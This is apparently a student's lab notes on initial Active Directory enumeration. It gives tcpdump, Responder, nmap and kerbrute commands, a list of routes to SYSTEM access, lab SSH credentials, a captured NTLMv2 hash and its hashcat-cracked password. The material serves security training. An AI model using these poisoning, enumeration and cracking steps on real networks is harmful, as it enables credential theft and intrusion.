# Initial Enumeration of the Domain

**Key Data Points**

| **Data Point**                  | **Description**                                                                                                                 |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `AD Users`                      | We are trying to enumerate valid user accounts we can target for password spraying.                                             |
| `AD Joined Computers`           | Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc. |
| `Key Services`                  | Kerberos, NetBIOS, LDAP, DNS                                                                                                    |
| `Vulnerable Hosts and Services` | Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)                                          |

Passive and Active Enumeration on the Network

```powershell
Wireshark
#TCPDUMP
sudo tcpdump -i ens224
#responder
sudo responder -I ens224 -A
#fping
fping -asgq 172.16.5.0/23
#nmap
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
nmap -A 172.16.5.100
#kerbrute to find valid usernames
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### There are several ways to gain SYSTEM-level access on a host, including but not limited to:

* Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
* Abusing a service running in the context of the `SYSTEM account`, or abusing the service account `SeImpersonate` privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
* Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
* Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window

### By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:

* Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
* Perform Kerberoasting / ASREPRoasting attacks within the same domain.
* Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
* Perform token impersonation to hijack a privileged domain user account.
* Carry out ACL attacks.

### Let's find a user!

```
SSH to 10.129.106.30 with user "htb-student" and password "HTB_@cademy_stdnt!"
```

Responder retrieved

```
B] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:ea342ab38223e77f:9E35FC99FBF5CBA081F66BC94381488E:0101000000000000802B0FC3890ED901E9C7F95077F4303300000000020008004A0049004300360001001E00570049004E002D005A004C004A004F0039003500450057004A004300530004003400570049004E002D005A004C004A004F0039003500450057004A00430053002E004A004900430036002E004C004F00430041004C00030014004A004900430036002E004C004F00430041004C00050014004A004900430036002E004C004F00430041004C0007000800802B0FC3890ED90106000400020000000800300030000000000000000000000000300000743F935961283F64BAA5A866993BF125129AABD0076CCB8906D5355156650D9A0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

```

Cracked with hashcat&#x20;

```powershell
#hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
h1backup55
```
